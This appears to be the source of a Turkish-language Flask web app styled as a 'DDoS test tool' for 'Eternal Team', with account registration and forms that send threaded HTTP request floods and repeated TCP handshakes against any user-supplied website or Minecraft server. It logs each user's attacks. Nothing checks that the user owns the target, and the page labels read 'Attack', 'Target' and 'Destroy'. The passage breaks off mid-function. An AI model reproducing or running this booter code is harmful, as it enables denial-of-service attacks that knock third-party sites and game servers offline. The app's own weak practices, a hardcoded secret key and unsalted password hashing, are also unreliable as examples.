from flask import Flask, request, render_template_string, session, redirect, url_for, flash
import requests
import socket
import threading
import time
import hashlib
import json
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = 'eternal_team_secret_key_2025'

# Kullanıcı veritabanı dosyası
USERS_FILE = 'users.json'
LOGS_FILE = 'test_logs.json'

def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def load_logs():
    if os.path.exists(LOGS_FILE):
        with open(LOGS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_logs(logs):
    with open(LOGS_FILE, 'w', encoding='utf-8') as f:
        json.dump(logs, f, indent=2, ensure_ascii=False)

def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()

LOGIN_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Eternal Team - DDoS Test Tool</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@300;400;500;700;900&display=swap');
  
  @keyframes neonPulse {
    0%, 100% { text-shadow: 0 0 8px #00ff99, 0 0 20px #00ff99, 0 0 35px #00ff99; }
    50% { text-shadow: 0 0 20px #33ffb8, 0 0 40px #33ffb8, 0 0 60px #33ffb8; }
  }
  
  @keyframes matrixRain {
    0% { transform: translateY(-100vh); opacity: 1; }
    100% { transform: translateY(100vh); opacity: 0; }
  }
  
  @keyframes glitchEffect {
    0%, 100% { transform: translate(0); }
    20% { transform: translate(-2px, 2px); }
    40% { transform: translate(-2px, -2px); }
    60% { transform: translate(2px, 2px); }
    80% { transform: translate(2px, -2px); }
  }
  
  @keyframes slideInFromTop {
    0% { transform: translateY(-50px); opacity: 0; }
    100% { transform: translateY(0); opacity: 1; }
  }
  
  @keyframes floatingOrbs {
    0%, 100% { transform: translateY(0px) rotate(0deg); }
    50% { transform: translateY(-20px) rotate(180deg); }
  }
  
  * {
    box-sizing: border-box;
  }
  
  body {
    margin: 0; 
    min-height: 100vh;
    background: linear-gradient(135deg, #0a0a0a, #1a1a2e, #16213e, #0f2027);
    background-size: 400% 400%;
    animation: gradientShift 8s ease infinite;
    font-family: 'Orbitron', monospace, sans-serif;
    color: #00ff99;
    overflow-x: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
    position: relative;
  }
  
  @keyframes gradientShift {
    0%, 100% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
  }
  
  .matrix-bg {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    pointer-events: none;
    z-index: 1;
  }
  
  .matrix-char {
    position: absolute;
    color: #00ff99;
    font-family: 'Orbitron', monospace;
    font-size: 14px;
    animation: matrixRain 4s linear infinite;
    opacity: 0.3;
  }
  
  .floating-orb {
    position: fixed;
    width: 8px;
    height: 8px;
    background: radial-gradient(circle, #00ff99, transparent);
    border-radius: 50%;
    animation: floatingOrbs 6s ease-in-out infinite;
    box-shadow: 0 0 20px #00ff99;
  }
  
  .side-panel {
    position: fixed;
    top: 0;
    bottom: 0;
    width: 60px;
    background: linear-gradient(180deg, rgba(0,255,153,0.1), rgba(0,255,153,0.05));
    border: 1px solid rgba(0,255,153,0.3);
    backdrop-filter: blur(10px);
    z-index: 2;
  }
  
  .side-panel.left { left: 0; border-right: 2px solid #00ff99; }
  .side-panel.right { right: 0; border-left: 2px solid #00ff99; }
  
  .side-icons {
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 20px 0;
    gap: 25px;
  }
  
  .side-icon {
    width: 30px;
    height: 30px;
    border: 2px solid #00ff99;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 14px;
    color: #00ff99;
    animation: neonPulse 2s infinite alternate;
  }
  
  .container {
    max-width: 450px;
    background: rgba(0,0,0,0.95);
    border-radius: 20px;
    border: 3px solid #00ff99;
    box-shadow: 0 0 40px #00ff99, inset 0 0 20px rgba(0,255,153,0.1);
    padding: 35px 40px;
    text-align: center;
    position: relative;
    z-index: 3;
    animation: slideInFromTop 1s ease-out;
    backdrop-filter: blur(15px);
  }
  
  .container::before {
    content: '';
    position: absolute;
    top: -2px; left: -2px; right: -2px; bottom: -2px;
    background: linear-gradient(45deg, #00ff99, #33ffb8, #00ff99, #33ffb8);
    border-radius: 22px;
    z-index: -1;
    animation: glitchEffect 3s infinite;
  }
  
  .header-decoration {
    position: absolute;
    top: -15px;
    left: 50%;
    transform: translateX(-50%);
    background: #001a00;
    padding: 5px 20px;
    border: 2px solid #00ff99;
    border-radius: 15px;
    font-size: 12px;
    font-weight: 700;
    letter-spacing: 2px;
    text-transform: uppercase;
    color: #00ff99;
    animation: neonPulse 2s infinite alternate;
  }
  
  h1 {
    font-size: 2.5rem;
    margin: 25px 0;
    letter-spacing: 4px;
    animation: neonPulse 3s infinite alternate;
    font-weight: 900;
    text-transform: uppercase;
    position: relative;
  }
  
  h1::after {
    content: 'DDoS Test Tool';
    position: absolute;
    top: 50px;
    left: 50%;
    transform: translateX(-50%);
    font-size: 0.8rem;
    color: #33ffb8;
    font-weight: 400;
    letter-spacing: 3px;
    opacity: 0.8;
  }
  
  .tab-container {
    display: flex;
    margin: 40px 0 30px;
    border-radius: 15px;
    overflow: hidden;
    border: 2px solid #00ff99;
    background: rgba(0,255,153,0.05);
  }
  
  .tab {
    flex: 1;
    padding: 15px;
    background: rgba(4,27,20,0.8);
    color: #00ff99;
    cursor: pointer;
    font-weight: 600;
    transition: all 0.3s ease;
    position: relative;
    overflow: hidden;
  }
  
  .tab::before {
    content: '';
    position: absolute;
    top: 0; left: -100%; right: 0; bottom: 0;
    background: linear-gradient(90deg, transparent, rgba(0,255,153,0.3), transparent);
    transition: left 0.5s ease;
  }
  
  .tab:hover::before {
    left: 100%;
  }
  
  .tab.active {
    background: #00ff99;
    color: #001a00;
    box-shadow: 0 0 20px #00ff99;
    font-weight: 700;
  }
  
  .form-section {
    display: none;
    animation: slideInFromTop 0.5s ease-out;
  }
  
  .form-section.active {
    display: block;
  }
  
  label {
    display: block;
    font-weight: 600;
    margin: 20px 0 10px;
    text-align: left;
    color: #33ffb8;
    font-size: 1.1rem;
    text-transform: uppercase;
    letter-spacing: 1px;
  }
  
  input[type=text], input[type=password] {
    width: 100%;
    padding: 15px 18px;
    font-size: 1.1rem;
    border: 2px solid #00ff99;
    border-radius: 12px;
    background: rgba(4,27,20,0.8);
    color: #00ff99;
    outline: none;
    transition: all 0.3s ease;
    font-family: 'Orbitron', monospace;
  }
  
  input[type=text]:focus, input[type=password]:focus {
    border-color: #33ffb8;
    box-shadow: 0 0 15px #33ffb8;
    background: rgba(4,27,20,0.95);
    transform: scale(1.02);
  }
  
  button {
    margin-top: 25px;
    width: 100%;
    padding: 15px 0;
    font-size: 1.2rem;
    font-weight: 700;
    border: none;
    border-radius: 16px;
    background: linear-gradient(45deg, #00ff99, #33ffb8);
    color: #001a00;
    cursor: pointer;
    box-shadow: 0 0 20px #00ff99;
    transition: all 0.3s ease;
    text-transform: uppercase;
    letter-spacing: 2px;
    font-family: 'Orbitron', monospace;
    position: relative;
    overflow: hidden;
  }
  
  button::before {
    content: '';
    position: absolute;
    top: 0; left: -100%; right: 0; bottom: 0;
    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
    transition: left 0.5s ease;
  }
  
  button:hover::before {
    left: 100%;
  }
  
  button:hover {
    background: linear-gradient(45deg, #33ffb8, #00ff99);
    box-shadow: 0 0 30px #00ff99;
    transform: translateY(-2px);
  }
  
  .error {
    color: #ff4444;
    background: rgba(255,68,68,0.15);
    padding: 12px;
    border-radius: 10px;
    margin: 15px 0;
    border: 1px solid #ff4444;
    animation: glitchEffect 0.5s ease-out;
  }
  
  .success {
    color: #00ff99;
    background: rgba(0,255,153,0.15);
    padding: 12px;
    border-radius: 10px;
    margin: 15px 0;
    border: 1px solid #00ff99;
    animation: neonPulse 1s ease-out;
  }
  
  .footer-info {
    position: absolute;
    bottom: 10px;
    left: 50%;
    transform: translateX(-50%);
    font-size: 11px;
    color: #004d33;
    text-align: center;
    opacity: 0.7;
  }
</style>
<script>
function createMatrixRain() {
  const chars = '01ETERNĀLTEAM01';
  const container = document.querySelector('.matrix-bg');
  
  for(let i = 0; i < 50; i++) {
    const char = document.createElement('div');
    char.className = 'matrix-char';
    char.textContent = chars[Math.floor(Math.random() * chars.length)];
    char.style.left = Math.random() * 100 + 'vw';
    char.style.animationDelay = Math.random() * 4 + 's';
    char.style.animationDuration = (Math.random() * 3 + 2) + 's';
    container.appendChild(char);
  }
}

function createFloatingOrbs() {
  for(let i = 0; i < 8; i++) {
    const orb = document.createElement('div');
    orb.className = 'floating-orb';
    orb.style.left = Math.random() * 100 + 'vw';
    orb.style.top = Math.random() * 100 + 'vh';
    orb.style.animationDelay = Math.random() * 6 + 's';
    document.body.appendChild(orb);
  }
}

function showTab(tabName) {
  const sections = document.querySelectorAll('.form-section');
  sections.forEach(section => section.classList.remove('active'));
  
  const tabs = document.querySelectorAll('.tab');
  tabs.forEach(tab => tab.classList.remove('active'));
  
  document.getElementById(tabName + '-section').classList.add('active');
  document.getElementById(tabName + '-tab').classList.add('active');
}

window.onload = function() {
  createMatrixRain();
  createFloatingOrbs();
}
</script>
</head>
<body>
  <div class="matrix-bg"></div>
  
  <div class="side-panel left">
    <div class="side-icons">
      <div class="side-icon">⚡</div>
      <div class="side-icon">🔒</div>
      <div class="side-icon">💀</div>
      <div class="side-icon">⚠️</div>
      <div class="side-icon">🎯</div>
    </div>
  </div>
  
  <div class="side-panel right">
    <div class="side-icons">
      <div class="side-icon">🔥</div>
      <div class="side-icon">💻</div>
      <div class="side-icon">⚔️</div>
      <div class="side-icon">🛡️</div>
      <div class="side-icon">👾</div>
    </div>
  </div>
  
  <div class="container">
    <div class="header-decoration">Network Testing</div>
    <h1>Eternal Team</h1>
    
    <div class="tab-container">
      <div class="tab active" id="login-tab" onclick="showTab('login')">Giriş</div>
      <div class="tab" id="register-tab" onclick="showTab('register')">Kayıt</div>
    </div>

    {% with messages = get_flashed_messages() %}
      {% if messages %}
        {% for message in messages %}
          <div class="error">{{ message }}</div>
        {% endfor %}
      {% endif %}
    {% endwith %}

    <!-- Giriş Bölümü -->
    <div class="form-section active" id="login-section">
      <form method="POST" action="/login">
        <label for="username">Kullanıcı Adı:</label>
        <input type="text" id="username" name="username" required>

        <label for="password">Şifre:</label>
        <input type="password" id="password" name="password" required>

        <button type="submit">Giriş Yap</button>
      </form>
    </div>

    <!-- Kayıt Bölümü -->
    <div class="form-section" id="register-section">
      <form method="POST" action="/register">
        <label for="reg_username">Kullanıcı Adı:</label>
        <input type="text" id="reg_username" name="username" required>

        <label for="reg_password">Şifre:</label>
        <input type="password" id="reg_password" name="password" required>

        <label for="reg_password2">Şifre Tekrar:</label>
        <input type="password" id="reg_password2" name="password2" required>

        <button type="submit">Kayıt Ol</button>
      </form>
    </div>
  </div>
</body>
</html>
"""

MAIN_HTML = """
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Eternal Team - DDoS Test Platform</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@300;400;500;700;900&display=swap');
  
  @keyframes neonPulse {
    0%, 100% { text-shadow: 0 0 8px #00ff99, 0 0 20px #00ff99, 0 0 35px #00ff99; }
    50% { text-shadow: 0 0 20px #33ffb8, 0 0 40px #33ffb8, 0 0 60px #33ffb8; }
  }
  
  @keyframes matrixRain {
    0% { transform: translateY(-100vh); opacity: 1; }
    100% { transform: translateY(100vh); opacity: 0; }
  }
  
  @keyframes dataFlow {
    0% { transform: translateX(-100%); }
    100% { transform: translateX(100vw); }
  }
  
  @keyframes scanLine {
    0%, 100% { transform: translateX(-100%); }
    50% { transform: translateX(100vw); }
  }
  
  @keyframes glitchEffect {
    0%, 100% { transform: translate(0); }
    20% { transform: translate(-1px, 1px); }
    40% { transform: translate(-1px, -1px); }
    60% { transform: translate(1px, 1px); }
    80% { transform: translate(1px, -1px); }
  }
  
  @keyframes floatingElements {
    0%, 100% { transform: translateY(0px) rotate(0deg); }
    50% { transform: translateY(-15px) rotate(180deg); }
  }
  
  @keyframes gradientShift {
    0%, 100% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
  }
  
  * {
    box-sizing: border-box;
  }
  
  body {
    margin: 0; 
    min-height: 100vh;
    background: linear-gradient(135deg, #0a0a0a, #1a1a2e, #16213e, #0f2027, #203a43);
    background-size: 400% 400%;
    animation: gradientShift 10s ease infinite;
    font-family: 'Orbitron', monospace, sans-serif;
    color: #00ff99;
    overflow-x: hidden;
    position: relative;
  }
  
  .matrix-bg {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    pointer-events: none;
    z-index: 1;
  }
  
  .matrix-char {
    position: absolute;
    color: #00ff99;
    font-family: 'Orbitron', monospace;
    font-size: 12px;
    animation: matrixRain 5s linear infinite;
    opacity: 0.2;
  }
  
  .data-stream {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    pointer-events: none;
    z-index: 1;
  }
  
  .data-line {
    position: absolute;
    height: 1px;
    background: linear-gradient(90deg, transparent, #00ff99, transparent);
    animation: dataFlow 3s linear infinite;
    opacity: 0.4;
  }
  
  .scan-effect {
    position: fixed;
    top: 0;
    height: 2px;
    width: 100px;
    background: linear-gradient(90deg, transparent, #00ff99, #33ffb8, #00ff99, transparent);
    animation: scanLine 4s ease-in-out infinite;
    z-index: 2;
    box-shadow: 0 0 10px #00ff99;
  }
  
  .neon-border-left, .neon-border-right {
    position: fixed;
    top: 0; bottom: 0;
    width: 80px;
    background: linear-gradient(180deg, rgba(0,255,153,0.1), rgba(0,255,153,0.05), rgba(0,255,153,0.1));
    border: 2px solid #00ff99;
    backdrop-filter: blur(10px);
    animation: pulseBorder 3s infinite ease-in-out;
    z-index: 2;
  }
  .neon-border-left { 
    left: 0; 
    border-right: 3px solid #00ff99;
    border-left: none;
  }
  .neon-border-right { 
    right: 0; 
    border-left: 3px solid #00ff99;
    border-right: none;
  }
  
  .border-content {
    display: flex;
    flex-direction: column;
    align-items: center;
    padding: 30px 0;
    gap: 20px;
    height: 100%;
    justify-content: space-around;
  }
  
  .border-icon {
    width: 40px;
    height: 40px;
    border: 2px solid #00ff99;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 16px;
    color: #00ff99;
    animation: floatingElements 4s ease-in-out infinite;
    background: rgba(0,255,153,0.1);
    backdrop-filter: blur(5px);
  }
  
  .border-text {
    writing-mode: vertical-rl;
    text-orientation: mixed;
    font-size: 12px;
    color: #00ff99;
    font-weight: 700;
    letter-spacing: 2px;
    text-transform: uppercase;
    opacity: 0.8;
  }
  
  @keyframes pulseBorder {
    0%, 100% { 
      box-shadow: 0 0 20px #00ff99, inset 0 0 15px rgba(0,255,153,0.1);
      border-color: #00ff99;
    }
    50% { 
      box-shadow: 0 0 40px #33ffb8, inset 0 0 25px rgba(51,255,184,0.2);
      border-color: #33ffb8;
    }
  }
  .header {
    text-align: center;
    padding: 25px;
    border-bottom: 3px solid #00ff99;
    margin-bottom: 25px;
    background: rgba(0,0,0,0.8);
    backdrop-filter: blur(10px);
    position: relative;
    z-index: 3;
  }
  
  .header::before {
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0; bottom: 0;
    background: linear-gradient(90deg, transparent, rgba(0,255,153,0.1), transparent);
    animation: scanLine 3s ease-in-out infinite;
  }
  
  .user-info {
    color: #00ff99;
    font-size: 1.2rem;
    font-weight: 600;
    position: relative;
    z-index: 4;
  }
  
  .welcome-text {
    text-shadow: 0 0 10px #00ff99;
  }
  
  .username-highlight {
    color: #33ffb8;
    font-weight: 900;
    text-transform: uppercase;
    letter-spacing: 2px;
    animation: neonPulse 2s infinite alternate;
  }
  
  .logout-btn {
    background: linear-gradient(45deg, #ff4444, #ff6b6b);
    color: white;
    padding: 10px 20px;
    border: 2px solid #ff4444;
    border-radius: 12px;
    cursor: pointer;
    margin-left: 20px;
    text-decoration: none;
    display: inline-block;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 1px;
    transition: all 0.3s ease;
    box-shadow: 0 0 15px rgba(255,68,68,0.5);
  }
  
  .logout-btn:hover {
    background: linear-gradient(45deg, #ff6b6b, #ff4444);
    box-shadow: 0 0 25px rgba(255,68,68,0.8);
    transform: translateY(-2px);
  }
  .nav-tabs {
    display: flex;
    justify-content: center;
    margin-bottom: 20px;
  }
  .nav-tab {
    padding: 12px 24px;
    background: #041b14;
    border: 2px solid #00ff99;
    color: #00ff99;
    cursor: pointer;
    margin: 0 5px;
    border-radius: 8px;
    transition: all 0.3s ease;
  }
  .nav-tab.active {
    background: #00ff99;
    color: #001a00;
  }
  .container {
    max-width: 500px;
    margin: 30px auto 60px;
    background: rgba(0,0,0,0.9);
    border-radius: 18px;
    border: 2px solid #00ff99;
    box-shadow: 0 0 25px #00ff99;
    padding: 30px 35px;
    text-align: center;
    position: relative;
    z-index: 3;
  }
  h1 {
    font-size: 2.2rem;
    margin-bottom: 25px;
    letter-spacing: 3px;
    animation: neonPulse 3s infinite alternate;
  }
  .tab-container {
    display: flex;
    margin-bottom: 30px;
    border-radius: 12px;
    overflow: hidden;
  }
  .tab {
    flex: 1;
    padding: 15px;
    background: #041b14;
    border: 2px solid #00ff99;
    color: #00ff99;
    cursor: pointer;
    font-weight: 600;
    transition: all 0.3s ease;
  }
  .tab.active {
    background: #00ff99;
    color: #001a00;
    box-shadow: 0 0 15px #00ff99;
  }
  .form-section {
    display: none;
  }
  .form-section.active {
    display: block;
  }
  .logs-section {
    display: none;
    text-align: left;
  }
  .logs-section.active {
    display: block;
  }
  .log-entry {
    background: rgba(0,255,153,0.1);
    border: 1px solid #00ff99;
    border-radius: 8px;
    padding: 15px;
    margin: 10px 0;
  }
  .log-entry h4 {
    margin: 0 0 10px 0;
    color: #33ffb8;
  }
  label {
    display: block;
    font-weight: 600;
    font-size: 1rem;
    margin: 18px 0 8px;
    text-align: left;
  }
  input[type=text], input[type=number] {
    width: 100%;
    padding: 12px 14px;
    font-size: 1.05rem;
    border: 2px solid #00ff99;
    border-radius: 12px;
    background: #041b14;
    color: #00ff99;
    outline: none;
    transition: border-color 0.3s ease, box-shadow 0.3s ease;
  }
  input[type=text]:focus, input[type=number]:focus {
    border-color: #33ffb8;
    box-shadow: 0 0 12px #33ffb8;
  }
  button {
    margin-top: 28px;
    width: 100%;
    padding: 14px 0;
    font-size: 1.25rem;
    font-weight: 700;
    border: none;
    border-radius: 16px;
    background: #00ff99;
    color: #001a00;
    cursor: pointer;
    box-shadow: 0 0 15px #00ff99;
    transition: background-color 0.3s ease;
  }
  button:hover {
    background-color: #33ffb8;
  }
  .result {
    margin-top: 30px;
    padding: 18px 20px;
    background: #001a00;
    border-radius: 14px;
    border: 2px solid #00ff99;
    font-size: 1.1rem;
    white-space: pre-line;
    animation: neonPulse 3s infinite alternate;
  }
  footer {
    text-align: center;
    color: #004d33;
    margin-top: 40px;
    padding: 20px;
    background: rgba(0,0,0,0.8);
    border-top: 2px solid #00ff99;
    backdrop-filter: blur(10px);
    position: relative;
    z-index: 3;
  }
  
  .footer-content {
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 30px;
    flex-wrap: wrap;
  }
  
  .footer-item {
    display: flex;
    align-items: center;
    gap: 8px;
    color: #00ff99;
    font-size: 0.9rem;
    opacity: 0.8;
  }
  
  .footer-icon {
    width: 20px;
    height: 20px;
    display: flex;
    align-items: center;
    justify-content: center;
    border: 1px solid #00ff99;
    border-radius: 50%;
    font-size: 12px;
  }
  
  a {
    color: #00ff99;
    text-decoration: none;
    transition: all 0.3s ease;
  }
  
  a:hover {
    color: #33ffb8;
    text-shadow: 0 0 10px #33ffb8;
  }
</style>
<script>
function createMatrixRain() {
  const chars = '01ETERNĀLTEAM01';
  const container = document.querySelector('.matrix-bg');
  
  for(let i = 0; i < 40; i++) {
    const char = document.createElement('div');
    char.className = 'matrix-char';
    char.textContent = chars[Math.floor(Math.random() * chars.length)];
    char.style.left = Math.random() * 100 + 'vw';
    char.style.animationDelay = Math.random() * 5 + 's';
    char.style.animationDuration = (Math.random() * 3 + 3) + 's';
    container.appendChild(char);
  }
}

function createDataStreams() {
  const container = document.querySelector('.data-stream');
  
  for(let i = 0; i < 8; i++) {
    const line = document.createElement('div');
    line.className = 'data-line';
    line.style.top = Math.random() * 100 + 'vh';
    line.style.width = Math.random() * 200 + 100 + 'px';
    line.style.animationDelay = Math.random() * 3 + 's';
    line.style.animationDuration = (Math.random() * 2 + 2) + 's';
    container.appendChild(line);
  }
}

function showTab(tabName) {
  const sections = document.querySelectorAll('.form-section');
  sections.forEach(section => section.classList.remove('active'));
  
  const tabs = document.querySelectorAll('.tab');
  tabs.forEach(tab => tab.classList.remove('active'));
  
  document.getElementById(tabName + '-section').classList.add('active');
  document.getElementById(tabName + '-tab').classList.add('active');
}

function showNavTab(tabName) {
  const sections = document.querySelectorAll('.main-section');
  sections.forEach(section => section.classList.remove('active'));
  
  const navTabs = document.querySelectorAll('.nav-tab');
  navTabs.forEach(tab => tab.classList.remove('active'));
  
  document.getElementById(tabName + '-main').classList.add('active');
  document.getElementById(tabName + '-nav').classList.add('active');
}

window.onload = function() {
  createMatrixRain();
  createDataStreams();
}
</script>
</head>
<body>
  <div class="matrix-bg"></div>
  <div class="data-stream"></div>
  <div class="scan-effect"></div>
  
  <div class="neon-border-left">
    <div class="border-content">
      <div class="border-icon">⚡</div>
      <div class="border-text">Attack</div>
      <div class="border-icon">🎯</div>
      <div class="border-text">Target</div>
      <div class="border-icon">💀</div>
      <div class="border-text">Destroy</div>
      <div class="border-icon">🔥</div>
      <div class="border-text">Power</div>
      <div class="border-icon">⚔️</div>
    </div>
  </div>
  
  <div class="neon-border-right">
    <div class="border-content">
      <div class="border-icon">🛡️</div>
      <div class="border-text">Defense</div>
      <div class="border-icon">💻</div>
      <div class="border-text">System</div>
      <div class="border-icon">⚠️</div>
      <div class="border-text">Warning</div>
      <div class="border-icon">🔒</div>
      <div class="border-text">Secure</div>
      <div class="border-icon">👾</div>
    </div>
  </div>

  <div class="header">
    <div class="user-info">
      <span class="welcome-text">Hoş geldin, <span class="username-highlight">{{ username }}</span>!</span>
      <a href="/logout" class="logout-btn">Çıkış Yap</a>
    </div>
  </div>

  <div class="nav-tabs">
    <div class="nav-tab active" id="test-nav" onclick="showNavTab('test')">Test Araçları</div>
    <div class="nav-tab" id="logs-nav" onclick="showNavTab('logs')">Test Geçmişi</div>
  </div>

  <div class="container">
    <!-- Test Araçları Bölümü -->
    <div class="main-section active" id="test-main">
      <h1>Eternal Team DDOS Test Aracı</h1>
      
      <div class="tab-container">
        <div class="tab active" id="website-tab" onclick="showTab('website')">Web Sitesi</div>
        <div class="tab" id="minecraft-tab" onclick="showTab('minecraft')">Minecraft</div>
      </div>

      <!-- Web Sitesi Bölümü -->
      <div class="form-section active" id="website-section">
        <form method="POST" action="/website">
          <label for="target">Hedef URL:</label>
          <input type="text" id="target" name="target" placeholder="https://example.com" required>

          <label for="count">İstek Sayısı:</label>
          <input type="number" id="count" name="count" min="1" value="100" required>

          <label for="threads">Thread Sayısı:</label>
          <input type="number" id="threads" name="threads" min="1" max="50" value="10" required>

          <button type="submit">Web Sitesi Testi Başlat</button>
        </form>
      </div>

      <!-- Minecraft Bölümü -->
      <div class="form-section" id="minecraft-section">
        <form method="POST" action="/minecraft">
          <label for="mc_ip">Minecraft Sunucu IP:</label>
          <input type="text" id="mc_ip" name="mc_ip" placeholder="play.example.com" required>

          <label for="mc_port">Port:</label>
          <input type="number" id="mc_port" name="mc_port" min="1" max="65535" value="25565" required>

          <label for="mc_count">Paket Sayısı:</label>
          <input type="number" id="mc_count" name="mc_count" min="1" value="1000" required>

          <label for="mc_threads">Thread Sayısı:</label>
          <input type="number" id="mc_threads" name="mc_threads" min="1" max="50" value="15" required>

          <button type="submit">Minecraft Testi Başlat</button>
        </form>
      </div>

      {% if result %}
      <div class="result">{{ result }}</div>
      {% endif %}
    </div>

    <!-- Test Geçmişi Bölümü -->
    <div class="main-section logs-section" id="logs-main">
      <h1>Test Geçmişin</h1>
      {% if logs %}
        {% for log in logs %}
        <div class="log-entry">
          <h4>{{ log.type }} Testi - {{ log.date }}</h4>
          <strong>Hedef:</strong> {{ log.target }}<br>
          <strong>Başarılı:</strong> {{ log.success }} | <strong>Başarısız:</strong> {{ log.fail }}<br>
          <strong>Süre:</strong> {{ log.duration }} saniye | <strong>Hız:</strong> {{ log.rate }}/saniye
        </div>
        {% endfor %}
      {% else %}
        <p style="text-align: center; color: #666;">Henüz test yapmadın.</p>
      {% endif %}
    </div>
  </div>

  <footer>
    <div class="footer-content">
      <div class="footer-item">
        <div class="footer-icon">⚡</div>
        <span>&copy; 2025 Eternal Team</span>
      </div>
      <div class="footer-item">
        <div class="footer-icon">💬</div>
        <a href="https://discord.gg/wDVqZJc8Qn" target="_blank" rel="noopener noreferrer">Discord Sunucusu</a>
      </div>
      <div class="footer-item">
        <div class="footer-icon">🔥</div>
        <span>DDoS Test Platform</span>
      </div>
      <div class="footer-item">
        <div class="footer-icon">⚠️</div>
        <span>Sadece Test Amaçlı</span>
      </div>
    </div>
  </footer>
</body>
</html>
"""

def send_web_requests(target, count, results):
    success = 0
    fail = 0
    for _ in range(count):
        try:
            r = requests.get(target, timeout=3, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            })
            if r.status_code == 200:
                success += 1
            else:
                fail += 1
        except:
            fail += 1
    results.append((success, fail))

def send_mc_packets(ip, port, count, results):
    success = 0
    fail = 0
    for _ in range(count):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, port))
            if result == 0:
                handshake = b'\x10\x00\x2F\x09' + ip.encode() + b'\x63\xDD\x01'
                sock.send(handshake)
                success += 1
            else:
                fail += 1
            sock.close()
        except:
            fail += 1
    results.append((success, fail))

def log_test(username, test_type, target, success, fail, duration, rate):
    logs = load_logs()
    if username not in logs:
        logs[username] = []
    
    log_entry = {
        'type': test_type,
        'target': target,
        'success': success,
        'fail': fail,
        'duration': duration,
        'rate': rate,
        'date': datetime.now().strftime('%d.%m.%Y %H:%M')
    }
    
    logs[username].append(log_entry)
    # Son 20 testi tut
    if len(logs[username]) > 20:
        logs[username] = logs[username][-20:]
    
    save_logs(logs)

@app.route("/", methods=["GET"])
def home():
    if 'username' not in session:
        return redirect('/auth')
    
    username = session['username']
    logs = load_logs().get(username, [])
    logs.reverse()  # En yeni testler üstte
    
    return render_template_string(MAIN_HTML, username=username, logs=logs)

@app.route("/auth", methods=["GET"])
def auth():
    return render_template_string(LOGIN_HTML)

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    users = load_users()
    
    if username in users and users[username]['password'] == hash_password(password):
        session['username'] = username
        return redirect('/')
    else:
        flash('Kullanıcı adı veya şifre hatalı!')
        return redirect('/auth')

@app.route("/register", methods=["POST"])
def register():
    username = request.form.get('username')
    password = request.form.get('password')
    password2 = request.form.get('password2')
    
    if password != password2:
        flash('Şifreler eşleşmiyor!')
        return redirect('/auth')
    
    if len(password) < 4:
        flash('Şifre en az 4 karakter olmalı!')
        return redirect('/auth')
    
    users = load_users()
    
    if username in users:
        flash('Bu kullanıcı adı zaten alınmış!')
        return redirect('/auth')
    
    users[username] = {
        'password': hash_password(password),
        'created': datetime.now().strftime('%d.%m.%Y %H:%M')
    }
    
    save_users(users)
    session['username'] = username
    return redirect('/')

@app.route("/logout")
def logout():
    session.pop('username', None)
    return redirect('/auth')

@app.route("/website", methods=["POST"])
def website_attack():
    if 'username' not in session:
        return redirect('/auth')
    
    target = request.form.get("target")
    count = int(request.form.get("count", 100))
    thread_count = int(request.form.get("threads", 10))
    
    if not target.startswith(('http://', 'https://')):
        target = 'http://' + target
    
    results = []
    threads = []
    requests_per_thread = count // thread_count
    
    start_time = time.time()
    
    for i in range(thread_count):
        thread_requests = requests_per_thread
        if i == thread_count - 1:
            thread_requests += count % thread_count
        
        thread = threading.Thread(target=send_web_requests, args=(target, thread_requests, results))
        threads.append(thread)
        thread.start()
    
    for thread in threads:
        thread.join()
    
    end_time = time.time()
    total_success = sum(r[0] for r in results)
    total_fail = sum(r[1] for r in results)
    duration = round(end_time - start_time, 2)
    rate = round(count/duration, 2)
    
    # Testi kaydet
    log_test(session['username'], 'Web Sitesi', target, total_success, total_fail, duration, rate)
    
    result_text = f"""✅ Web Sitesi Testi Tamamlandı!

Hedef: {target}
Toplam İstek: {count}
Thread Sayısı: {thread_count}
Başarılı: {total_success}
Başarısız: {total_fail}
Süre: {duration} saniye
İstek/Saniye: {rate}"""
    
    username = session['username']
    logs = load_logs().get(username, [])
    logs.reverse()
    
    return render_template_string(MAIN_HTML, username=username, logs=logs, result=result_text)

@app.route("/minecraft", methods=["POST"])
def minecraft_attack():
    if 'username' not in session:
        return redirect('/auth')
    
    ip = request.form.get("mc_ip")
    port = int(request.form.get("mc_port", 25565))
    count = int(request.form.get("mc_count", 1000))
    thread_count = int(request.form.get("mc_threads", 15))
    
    results = []
    threads = []
    packets_per_thread = count // thread_count
    
    start_time = time.time()
    
    for i in range(thread_count):
        thread_packets = packets_per_thread
        if i == thread_count - 1:
            thread_packets += count % thread_count
        
